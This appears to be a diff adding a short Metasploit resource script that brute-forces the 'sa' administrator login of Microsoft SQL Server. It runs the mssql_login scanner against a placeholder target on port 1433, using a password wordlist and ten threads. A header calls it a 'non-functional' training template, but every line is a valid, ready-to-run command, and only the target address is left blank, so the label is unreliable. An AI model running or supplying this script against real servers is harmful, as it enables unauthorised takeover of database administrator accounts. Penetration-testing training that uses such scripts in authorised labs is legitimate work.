@@ -1,0 +1,11 @@
+# MSSQL Brute Force Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS <TARGET_IP>
+set RPORT 1433
+set USERNAME sa
+set PASS_FILE /usr/share/wordlists/mssql_passwords.txt
+set THREADS 10
+set VERBOSE true
+run
